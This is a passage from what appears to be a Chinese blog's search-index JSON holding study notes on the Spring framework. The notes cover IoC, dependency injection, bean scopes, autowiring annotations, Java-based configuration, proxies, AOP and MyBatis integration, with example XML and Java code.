xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003c!--在Spring中创建对象，在Spring这些都称为bean 类型 变量名 = new 类型(); Holle holle = new Holle(); bean = 对象(holle) id = 变量名(holle) class = new的对象(new Holle();) property 相当于给对象中的属性设值,让str=\"Spring\" --\u003e \u003cbean id=\"hello\" class=\"pojo.Hello\"\u003e \u003cproperty name=\"str\" value=\"Spring\"/\u003e \u003c/bean\u003e \u003c/beans\u003e 测试类MyTest package holle1; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; import pojo.Hello; public class MyTest { public static void main(String[] args) { //获取Spring的上下文对象 ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\"); //我们的对象下能在都在spring·中管理了，我们要使用，直接取出来就可以了 Hello holle = (Hello) context.getBean(\"hello\"); System.out.println(holle.toString()); } } 核心用set注入，所以必须要有下面的se()方法 //Hello类 public void setStr(String str) { this.str = str; } 思考： IoC：对象由Spring 来创建，管理，装配！ 弹幕评论里面的理解： 原来这套程序是：你写好菜单买好菜，客人来了自己把菜炒好招待，就相当于你请人吃饭 现在这套程序是：你告诉楼下餐厅，你要哪些菜，客人来的时候，餐厅把做好的你需要的菜送上来 IoC：炒菜这件事，不再由你自己来做，而是委托给了第三方__餐厅来做 此时的区别就是，如果我还需要做其他的菜，我不需要自己搞菜谱买材料再做好，而是告诉餐厅，我要什么菜，什么时候要，你做好送来 . 在前面第一个module试试引入Spring \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:s","date":"2021-04-06","objectID":"/posts/spring/:3:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"4、IoC创建对象的方式 使用无参构造创建对象，默认。 使用有参构造（如下） 下标赋值 index指的是有参构造中参数的下标，下标从0开始; \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"user\" class=\"pojo.User\"\u003e \u003cconstructor-arg index=\"0\" value=\"chen\"/\u003e \u003c/bean\u003e \u003c/beans\u003e 类型赋值（不建议使用） \u003cbean id=\"user\" class=\"pojo.User\"\u003e \u003cconstructor-arg type=\"java.lang.String\" value=\"kuang\"/\u003e \u003c/bean\u003e 直接通过参数名（掌握） \u003cbean id=\"user\" class=\"pojo.User\"\u003e \u003cconstructor-arg name=\"name\" value=\"kuang\"\u003e\u003c/constructor-arg\u003e \u003c/bean\u003e \u003c!-- 比如参数名是name，则有name=\"具体值\" --\u003e 注册bean之后就对象的初始化了（类似 new 类名()） 弹幕评论： name方式还需要无参构造和set方法,index和type只需要有参构造 就算是new 两个对象，也是只有一个实例（单例模式：全局唯一） User user = (User) context.getBean(\"user\"); User user2 = (User) context.getBean(\"user\"); system.out.println(user == user2)//结果为true 总结：在配置文件加载的时候，容器(\u003c bean\u003e)中管理的对象就已经初始化了 ","date":"2021-04-06","objectID":"/posts/spring/:4:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"5、Spring配置 ","date":"2021-04-06","objectID":"/posts/spring/:5:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"5.1、别名 \u003cbean id=\"user\" class=\"pojo.User\"\u003e \u003cconstructor-arg name=\"name\" value=\"chen\"\u003e\u003c/constructor-arg\u003e \u003c/bean\u003e \u003calias name=\"user\" alias=\"userLove\"/\u003e \u003c!-- 使用时 User user2 = (User) context.getBean(\"userLove\"); --\u003e ","date":"2021-04-06","objectID":"/posts/spring/:5:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"5.2、Bean的配置 \u003c!--id：bean的唯一标识符，也就是相当于我们学的对象名 class：bean对象所对应的会限定名：包名+类型 name：也是别名，而且name可以同时取多个别名 --\u003e \u003cbean id=\"user\" class=\"pojo.User\" name=\"u1 u2,u3;u4\"\u003e \u003cproperty name=\"name\" value=\"chen\"/\u003e \u003c/bean\u003e \u003c!-- 使用时 User user2 = (User) context.getBean(\"u1\"); --\u003e ","date":"2021-04-06","objectID":"/posts/spring/:5:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"5.3、import import一般用于团队开发使用，它可以将多个配置文件，导入合并为一个 假设，现在项目中有多个人开发，这三个人复制不同的类开发，不同的类需要注册在不同的bean中，我们可以利 用import将所有人的beans.xml合并为一个总的！ 张三(beans.xm1) 李四(beans2.xm1) 王五(beans3.xm1) applicationContext.xml \u003cimport resource=\"beans.xm1\"/\u003e \u003cimport resource=\"beans2.xml\"/\u003e \u003cimport resource=\"beans3.xm1\"/\u003e 使用的时候，直接使用总的配置就可以了 弹幕评论： 按照在总的xml中的导入顺序来进行创建，后导入的会重写先导入的，最终实例化的对象会是后导入xml中的那个 ","date":"2021-04-06","objectID":"/posts/spring/:5:3","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"6、依赖注入（DI） ","date":"2021-04-06","objectID":"/posts/spring/:6:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"6.1、构造器注入 第4点有提到 ","date":"2021-04-06","objectID":"/posts/spring/:6:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"6.2、set方式注入【重点】 依赖注入：set注入！ 依赖：bean对象的创建依赖于容器 注入：bean对象中的所有属性，由容器来注入 【环境搭建】 复杂类型 Address类 真实测试对象 Student类 beans.xml 测试 MyTest3 Student类 package pojo; import java.util.*; @Get @Set public class Student { //别忘了写get和set方法（用lombok注解也行） private String name; private Address address; private String[] books; private List\u003cString\u003e hobbies; private Map\u003cString, String\u003e card; private Set\u003cString\u003e game; private Properties infor; private String wife; @Override public String toString() { return \"Student{\" +\"\\n\"+ \"name='\" + name + '\\'' +\"\\n\"+ \", address=\" + address.toString() +\"\\n\"+ \", books=\" + Arrays.toString(books) +\"\\n\"+ \", hobbies=\" + hobbies +\"\\n\"+ \", card=\" + card +\"\\n\"+ \", game=\" + game +\"\\n\"+ \", infor=\" + infor +\"\\n\"+ \", wife='\" + wife + '\\'' +\"\\n\"+ '}'; } } Address类 package pojo; public class Address { private String address; public String getAddress() { return address; } public void setAddress(String address) { this.address = address; } @Override public String toString() { return \"Address{\" + \"address='\" + address + '\\'' + '}'; } } beans.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"address\" class=\"pojo.Address\"\u003e \u003cproperty name=\"address\" value=\"address你好\" /\u003e \u003c/bean\u003e \u003cbean id=\"student\" class=\"pojo.Student\"\u003e \u003c!--第一种，普通值注入 --\u003e \u003cproperty name=\"name\" value=\"name你好\" /\u003e \u003c!--第二种，ref注入 --\u003e \u003cproperty name=\"address\" ref=\"address\" /\u003e \u003c!--数组注入 --\u003e \u003cproperty name=\"books\"\u003e \u003carray\u003e \u003cvalue\u003e三国\u003c/value\u003e \u003cvalue\u003e西游\u003c/value\u003e \u003cvalue\u003e水浒\u003c/value\u003e \u003c/array\u003e \u003c/property\u003e \u003c!--list列表注入 --\u003e \u003cproperty name=\"hobbies\"\u003e \u003clist\u003e \u003cvalue\u003e唱\u003c/value\u003e \u003cvalue\u003e跳\u003c/value\u003e \u003cvalue\u003erap\u003c/value\u003e \u003cvalue\u003e篮球\u003c/value\u003e \u003c/list\u003e \u003c/property\u003e \u003c!--map键值对注入 --\u003e \u003cproperty name=\"card\"\u003e \u003cmap\u003e \u003centry key=\"username\" value=\"root\" /\u003e \u003centry key=\"password\" value=\"root\" /\u003e \u003c/map\u003e \u003c/property\u003e \u003c!--set(可去重)注","date":"2021-04-06","objectID":"/posts/spring/:6:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"6.3、拓展注入 官方文档位置 pojo增加User类 package pojo; public class User { private String name; private int id; public User() { } public User(String name, int id) { super(); this.name = name; this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getId() { return id; } public void setId(int id) { this.id = id; } @Override public String toString() { return \"User [name=\" + name + \", id=\" + id + \"]\"; } } 注意： beans 里面加上这下面两行 使用p和c命名空间需要导入xml约束 xmlns:p=“http://www.springframework.org/schema/p” xmlns:c=“http://www.springframework.org/schema/c” ?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:c=\"http://www.springframework.org/schema/c\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003c!--p命名空间注入/set注入，可以直接注入属性的值-》property--\u003e \u003cbean id=\"user\" class=\"pojo.User\" p:name=\"cxk\" p:id=\"20\" \u003e \u003c/bean\u003e \u003c!--c命名空间，通过构造器注入，需要写入有参和无参构造方法-》construct-args--\u003e \u003cbean id=\"user2\" class=\"pojo.User\" c:name=\"cbh\" c:id=\"22\"\u003e\u003c/bean\u003e \u003c/beans\u003e 测试 ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\"); User user = context.getBean(\"user\",User.class);//确定class对象，就不用再强转了 System.out.println(user.toString()); ","date":"2021-04-06","objectID":"/posts/spring/:6:3","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"6.4、Bean作用域 单例模式（默认） \u003cbean id=\"user2\" class=\"pojo.User\" c:name=\"cxk\" c:age=\"19\" scope=\"singleton\"\u003e\u003c/bean\u003e 1 弹幕评论：单例模式是把对象放在pool中，需要再取出来，使用的都是同一个对象实例 原型模式: 每次从容器中get的时候，都产生一个新对象！ \u003cbean id=\"user2\" class=\"pojo.User\" c:name=\"cxk\" c:age=\"19\" scope=\"prototype\"\u003e\u003c/bean\u003e 1 其余的request、session、application这些只能在web开放中使用！ ","date":"2021-04-06","objectID":"/posts/spring/:6:4","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"7、Bean的自动装配 自动装配是Spring满足bean依赖的一种方式 Spring会在上下文自动寻找，并自动给bean装配属性 在Spring中有三种装配的方式 在xml中显示配置 在java中显示配置 隐式的自动装配bean 【重要】 环境搭建：一个人有两个宠物 byType自动装配：byType会自动查找，和自己对象set方法参数的类型相同的bean 保证所有的class唯一(类为全局唯一) byName自动装配：byName会自动查找，和自己对象set对应的值对应的id 保证所有id唯一，并且和set注入的值一致 \u003c!-- 找不到id和多个相同class --\u003e \u003cbean id=\"cat1\" class=\"pojo.Cat\"/\u003e \u003cbean id=\"cat2\" class=\"pojo.Cat\"/\u003e \u003c!-- 找不到 id=cat，且有两个Cat --\u003e ","date":"2021-04-06","objectID":"/posts/spring/:7:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"7.1测试：自动装配 pojo的Cat类 public class Cat { public void shut(){ System.out.println(\"miao\"); } } pojo的Dog类 public class Dog { public void shut(){ System.out.println(\"wow\"); } } pojo的People类 package pojo; public class People { private Cat cat; private Dog dog; private String name; public Cat getCat() { return cat; } public void setCat(Cat cat) { this.cat = cat; } public Dog getDog() { return dog; } public void setDog(Dog dog) { this.dog = dog; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"People{\" + \"cat=\" + cat + \", dog=\" + dog + \", name='\" + name + '\\'' + '}'; } } xml配置 -\u003e byType 自动装配 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"cat\" class=\"pojo.Cat\"/\u003e \u003cbean id=\"dog\" class=\"pojo.Dog\"/\u003e \u003c!--byType会在容器自动查找，和自己对象属性相同的bean 例如，Dog dog; 那么就会查找pojo的Dog类，再进行自动装配 --\u003e \u003cbean id=\"people\" class=\"pojo.People\" autowire=\"byType\"\u003e \u003cproperty name=\"name\" value=\"cbh\"\u003e\u003c/property\u003e \u003c/bean\u003e \u003c/beans\u003e xml配置 -\u003e byName 自动装配 \u003cbean id=\"cat\" class=\"pojo.Cat\"/\u003e \u003cbean id=\"dog\" class=\"pojo.Dog\"/\u003e \u003c!--byname会在容器自动查找，和自己对象set方法的set后面的值对应的id 例如:setDog()，取set后面的字符作为id，则要id = dog 才可以进行自动装配 --\u003e \u003cbean id=\"people\" class=\"pojo.People\" autowire=\"byName\"\u003e \u003cproperty name=\"name\" value=\"cbh\"\u003e\u003c/property\u003e \u003c/bean\u003e 弹幕评论：byName只能取到小写，大写取不到 ","date":"2021-04-06","objectID":"/posts/spring/:7:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"7.2、使用注解实现自动装配 jdk1.5支持的注解，spring2.5支持的注解 The introduction of annotation-based configuration raised the question of whether this approach is “better” than XML.（翻译：基于注释的配置的引入提出了一个问题，即这种方法是否比XML“更好”） 导入context约束 xmlns:context=“http://www.springframework.org/schema/context\" 配置注解的支持：\u003c context:annotation-config/\u003e \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003ccontext:annotation-config/\u003e \u003c/beans\u003e 7.2.1、@Autowired 默认是byType方式，如果匹配不上，就会byName 在属性上个使用，也可以在set上使用 我们可以不用编写set方法了，前提是自动装配的属性在Spring容器里，且要符合ByName 自动装配 public class People { @Autowired private Cat cat; @Autowired private Dog dog; private String name; } @Nullable 字段标记了这个注解，说明该字段可以为空 public name(@Nullable String name){ } //源码 public @interface Autowired { boolean required() default true; } 如果定义了Autowire的require属性为false，说明这个对象可以为null，否则不允许为空（false表示找不到装配，不抛出异常） 7.2.2、@Autowired+@Qualifier @Autowired不能唯一装配时，需要@Autowired+@Qualifier 如果@Autowired自动装配环境比较复杂。自动装配无法通过一个注解完成的时候，可以使用@Qualifier(value = “dog”)去配合使用，指定一个唯一的id对象 public class People { @Autowired private Cat cat; @Autowired @Qualifier(value = \"dog\") private Dog dog; private String name; } 弹幕评论： 如果xml文件中同一个对象被多个bean使用，Autowired无法按类型找到，可以用@Qualifier指定id查找 7.2.3、@Resource 默认是byName方式，如果匹配不上，就会byType public class People { Resource(name=\"cat\") private Cat cat; Resource(name=\"dog\") private Dog dog; private String name; } 弹幕评论： Autowired是byType，@Autowired+@Qualifier = byType || byName Autowired是先byteType,如果唯一則注入，否则byName查找。resource是先byname,不符合再继续byType 区别： @Resource和@Autowired的区别： 都是用来自动装配的，都可以放在属性字段上 @Autowired通过byType的方式实现，而且必须要求这个对象存在！【常用】 @Resource默认通过byname的方式实现，如果找不到","date":"2021-04-06","objectID":"/posts/spring/:7:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8、使用注解开发 在spring4之后，使用注解开发，必须要保证aop包的导入 使用注解需要导入contex的约束 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003ccontext:annotation-config/\u003e \u003c/beans\u003e ","date":"2021-04-06","objectID":"/posts/spring/:8:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8.1、bean 弹幕评论： 有了\u003c context:component-scan\u003e，另一个\u003c context:annotation-config/\u003e标签可以移除掉，因为已经被包含进去了。 \u003c!--指定要扫描的包，这个包下面的注解才会生效 别只扫一个com.kuang.pojo包--\u003e \u003ccontext:component-scan base-package=\"com.kuang\"/\u003e \u003ccontext:annotation-config/\u003e //@Component 组件 //等价于\u003cbean id=\"user\" classs\"pojo.User\"/\u003e @Component public class User { public String name =\"秦疆\"; } ","date":"2021-04-06","objectID":"/posts/spring/:8:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8.2、属性如何注入@value @Component public class User { //相当于\u003cproperty name=\"name\" value=\"kuangshen\"/\u003e @value(\"kuangshen\") public String name; //也可以放在set方法上面 //@value(\"kuangshen\") public void setName(String name) { this.name = name; } } ","date":"2021-04-06","objectID":"/posts/spring/:8:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8.3、衍生的注解 @Component有几个衍生注解，会按照web开发中，mvc架构中分层。 dao （@Repository） service（@Service） controller（@Controller） 这四个注解的功能是一样的，都是代表将某个类注册到容器中 ","date":"2021-04-06","objectID":"/posts/spring/:8:3","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8.4、自动装配置 @Autowired：默认是byType方式，如果匹配不上，就会byName @Nullable：字段标记了这个注解，说明该字段可以为空 @Resource：默认是byName方式，如果匹配不上，就会byType ","date":"2021-04-06","objectID":"/posts/spring/:8:4","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8.5、作用域@scope //原型模式prototype，单例模式singleton //scope(\"prototype\")相当于\u003cbean scope=\"prototype\"\u003e\u003c/bean\u003e @Component @scope(\"prototype\") public class User { //相当于\u003cproperty name=\"name\" value=\"kuangshen\"/\u003e @value(\"kuangshen\") public String name; //也可以放在set方法上面 @value(\"kuangshen\") public void setName(String name) { this.name = name; } } ","date":"2021-04-06","objectID":"/posts/spring/:8:5","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"8.6、小结 xml与注解： xml更加万能，维护简单，适用于任何场合 注解，不是自己的类使用不了，维护复杂 最佳实践： xml用来管理bean 注解只用来完成属性的注入 要开启注解支持 ","date":"2021-04-06","objectID":"/posts/spring/:8:6","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"9、使用Java的方式配置Spring 不使用Spring的xml配置，完全交给java来做！ Spring的一个子项目，在spring4之后，，，它成为了核心功能 实体类：pojo的User.java //这里这个注解的意思,就是说明这个类被Spring接管了,注册到了容器中 @component public class User { private String name; public String getName() { return name; } //属性注入值 @value(\"QINJIANG') public void setName(String name) { this.name = name; } @Override public String toString() { return \"user{\" + \"name='\" + name + '\\''+ '}'; } } 弹幕评论：要么使用@Bean，要么使用@Component和ComponentScan，两种效果一样 配置文件：config中的kuang.java @Import(KuangConfig2.class)，用@import来包含KuangConfig2.java //这个也会Spring容器托管,注册到容器中,因为他本米就是一个@Component // @Configuration表这是一个配置类,就像我们之前看的beans.xml，类似于\u003cbeans\u003e标签 @Configuration @componentScan(\"com.Kuang.pojo\") //开启扫描 //@Import(KuangConfig2.class) public class KuangConfig { //注册一个bean , 就相当于我们之前写的一个bean 标签 //这个方法的名字,就相当于bean 标签中的 id 属性 -\u003egetUser //这个方法的返同值,就相当于bean 标签中的class 属性 -\u003eUser //@Bean public User getUser(){ return new User(); //就是返回要注入到bean的对象! } } 弹幕评论：ComponentScan、@Component(“pojo”) 这两个注解配合使用 测试类 public class MyTest { public static void main(String[ ] args) { //如果完全使用了配置类方式去做,我们就只能通过 Annotationconfig 上下文来获取容器,通过配置类的class对象加载! ApplicationContext context = new AnnotationConfigApplicationContext(KuangConfig.Class); //class对象 User getUser =(User)context.getBean( \"getUser\"); //方法名getUser System.out.Println(getUser.getName()); } } 会创建两个相同对象问题的说明： 弹幕总结 - -\u003e @Bean是相当于\u003c bean\u003e标签创建的对象，而我们之前学的@Component是通过spring自动创建的这个被注解声明的对象，所以这里相当于有两个User对象被创建了。一个是bean标签创建的（@Bean），一个是通过扫描然后使用@Component，spring自动创建的User对象，所以这里去掉@Bean这些东西，然后开启扫描。之后在User头上用@Component即可达到spring自动创建User对象了 //这个也会Spring容器托管,注册到容器中,因为他本米就是一个@Component // @Configuration表这是一个配置类,就像我们之前看的beans.xml，类似于\u003cbeans\u003e标签 @Configuration @componentScan(\"com.Kuang.pojo\") //开启扫描 //@Import(KuangConfig2.class) public class KuangConfig { //注册一个bean , 就相当于我们之前写的一个bean 标签 //这个方法的名字,就相当于bean 标签中的 id 属性 -\u003egetUser //这个方法的返同值,就相当于bean 标签中的class 属性 -\u003eUser //@Bean public User getUser(){ return new User(); //就是返回要注入到bean的对象! } } 弹幕评论：ComponentScan、@Component(“pojo”) 这两个注解","date":"2021-04-06","objectID":"/posts/spring/:9:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"10、动态代理 代理模式是SpringAOP的底层 分类：动态代理和静态代理 ","date":"2021-04-06","objectID":"/posts/spring/:10:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"10.1、静态代理 代码步骤： 1、接口 package pojo; public interface Host { public void rent(); } 2、真实角色 package pojo; public class HostMaster implements Host{ public void rent() { System.out.println(\"房东要出租房子\"); } } 3、代理角色 package pojo; public class Proxy { public Host host; public Proxy() { } public Proxy(Host host) { super(); this.host = host; } public void rent() { seeHouse(); host.rent(); fee(); sign(); } //看房 public void seeHouse() { System.out.println(\"看房子\"); } //收费 public void fee() { System.out.println(\"收中介费\"); } //合同 public void sign() { System.out.println(\"签合同\"); } } 4、客户端访问代理角色 package holle4_proxy; import pojo.Host; import pojo.HostMaster; import pojo.Proxy; public class My { public static void main(String[] args) { //房东要出租房子 Host host = new HostMaster(); //中介帮房东出租房子，但也收取一定费用（增加一些房东不做的操作） Proxy proxy = new Proxy(host); //看不到房东，但通过代理，还是租到了房子 proxy.rent(); } } 代码翻倍：几十个真实角色就得写几十个代理 AOP横向开发 ","date":"2021-04-06","objectID":"/posts/spring/:10:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"10.2、动态代理 动态代理和静态角色一样，动态代理底层是反射机制 动态代理类是动态生成的，不是我们直接写好的！ 动态代理(两大类)：基于接口，基于类 基于接口：JDK的动态代理【使用ing】 基于类：cglib java字节码实现：javasisit 了解两个类 1、Proxy：代理 2、InvocationHandler：调用处理程序 实例： 接口 Host.java //接口 package pojo2; public interface Host { public void rent(); } 接口Host实现类 HostMaster.java //接口实现类 package pojo2; public class HostMaster implements Host{ public void rent() { System.out.println(\"房东要租房子\"); } } 代理角色的处理程序类 ProxyInvocationHandler.java package pojo2; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; ///用这个类，自动生成代理 public class ProxyInvocationHandler implements InvocationHandler { // Foo f =(Foo) Proxy.NewProxyInstance(Foo. Class.GetClassLoader(), // new Class\u003c?\u003e[] { Foo.Class }, // handler); // 被代理的接口 public HostMaster hostMaster ; public void setHostMaster(HostMaster hostMaster) { this.hostMaster = hostMaster; } // 得到生成的代理类 public Object getProxy() { // newProxyInstance() -\u003e 生成代理对象，就不用再写具体的代理类了 // this.getClass().getClassLoader() -\u003e 找到加载类的位置 // hostMaster.getClass().getInterfaces() -\u003e 代理的具体接口 // this -\u003e 代表了接口InvocationHandler的实现类ProxyInvocationHandler return Proxy.newProxyInstance(this.getClass().getClassLoader(), hostMaster.getClass().getInterfaces(), this); // 处理代理实例并返回结果 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { seeHouse(); // 动态代理的本质，就是使用反射机制实现的 // invoke()执行它真正要执行的方法 Object result = method.invoke(hostMaster, args); fee(); return result; } public void seeHouse() { System.out.println(\"看房子\"); } public void fee() { System.out.println(\"收中介费\"); } } 用户类 My2.java package holle4_proxy; import pojo2.Host; import pojo2.Host2; import pojo2.HostMaster; import pojo2.ProxyInvocationHandler; public class My2 { public static void main(String[] args) { //真实角色 HostMaster hostMaster = new HostMaster(); //代理角色，现在没有；用代理角色的处理程序来实现Host接口的调用 ProxyInvocationHandler pih = new ProxyInvocationHandler(); //pih -\u003e HostMaster接口类 -\u003e Host接口 pih.setHostMaster(hostMaster); //获取newProxyInstance动态生成代","date":"2021-04-06","objectID":"/posts/spring/:10:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"11、AOP ","date":"2021-04-06","objectID":"/posts/spring/:11:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"11.1、什么是AOP ","date":"2021-04-06","objectID":"/posts/spring/:11:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"11.2、AOP在Spring中的使用 提供声明式事务，允许用户自定义切面 横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志，安全，缓存，事务等等… 切面(Aspect)：横切关注点 被模块化的特殊对象。即，它是一个类。（Log类） 通知(Advice)：切面必须要完成的工作。即，它是类中的一个方法。（Log类中的方法） 目标(Target)：被通知对象。（生成的代理类) 代理(Proxy)：向目标对象应用通知之后创建的对象。（生成的代理类） 切入点(PointCut)：切面通知执行的”地点”的定义。（最后两点：在哪个地方执行，比如：method.invoke()） 连接点(JointPoint)：与切入点匹配的执行点。 SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice: 即AOP在不改变原有代码的情况下，去增加新的功能。（代理） ","date":"2021-04-06","objectID":"/posts/spring/:11:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"11.3、使用Spring实现AOP 导入jar包 \u003c!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.aspectj\u003c/groupId\u003e \u003cartifactId\u003easpectjweaver\u003c/artifactId\u003e \u003cversion\u003e1.9.4\u003c/version\u003e \u003c/dependency\u003e 11.3.1、方法一：使用原生spring接口 springAPI接口实现 applicationContext.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd\"\u003e \u003c!--注册bean--\u003e \u003cbean id=\"userservice\" class=\"service.UserServiceImpl\"/\u003e \u003cbean id=\"log\" class=\"log.Log\"/\u003e \u003cbean id=\"afterLog\" class=\"log.AfterLog\"/\u003e \u003c!--方式一，使用原生Spring API接口--\u003e \u003c!--配置aop,还需要导入aop约束--\u003e \u003caop:config\u003e \u003c!--切入点：expression:表达式，execution（要执行的位置）--\u003e \u003caop:pointcut id=\"pointcut\" expression=\"execution(* service.UserServiceImpl.*(..))\"/\u003e \u003c!--UserServiceImpl.*(..) -》 UserServiceImpl类下的所以方法(参数)--\u003e \u003c!--执行环绕增加--\u003e \u003caop:advisor advice-ref=\"log\" pointcut-ref=\"pointcut\"/\u003e \u003caop:advisor advice-ref=\"afterLog\" pointcut-ref=\"pointcut\"/\u003e \u003c!-- 环绕,在id=\"pointcut\"的前后切入 --\u003e \u003c/aop:config\u003e \u003c/beans\u003e execution(返回类型，类名，方法名(参数)) -\u003e execution(* com.service.,(…)) UserService.java package service; public interface UserService { public void add() ; public void delete() ; public void query() ; public void update(); } UserService 的实现类 UserServiceImp.java package service; public class UserServiceImpl implements UserService { public void add() { System.out.println(\"add增\"); } public void delete() { System.out.println(\"delete删\"); } public void update() { System.out.println(\"update改\"); } public void query() { System.out.println(\"query查\"); } } 前置Log.java package log; import org.springframework.aop.MethodBeforeAdvice; import java.lang.reflect.Method; public class Log implements MethodBeforeAdvice { //m","date":"2021-04-06","objectID":"/posts/spring/:11:3","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"12、整合mybatis mybatis-spring官网：https://mybatis.org/spring/zh/ mybatis的配置流程： 编写实体类 编写核心配置文件 编写接口 编写Mapper.xmi 测试 ","date":"2021-04-06","objectID":"/posts/spring/:12:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"12.1、mybatis-spring-方式一 编写数据源配置 sqISessionFactory sqISessionTemplate（相当于sqISession） 需要给接口加实现类【new】 将自己写的实现类，注入到Spring中 测试！ 先导入jar包 \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --\u003e \u003cdependency\u003e 